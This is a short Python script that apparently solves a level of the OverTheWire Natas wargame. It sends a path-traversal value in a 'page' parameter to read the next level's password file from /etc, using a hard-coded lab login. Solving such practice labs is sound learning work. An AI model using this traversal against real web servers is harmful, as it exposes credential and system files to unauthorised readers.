import requests

url = 'http://natas7.natas.labs.overthewire.org'
s = requests.Session()
s.auth = ('natas7', 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr')
url += '/index.php?page=../../../../../../../etc/natas_webpass/natas8'
r = s.get(url)
print(r.text)
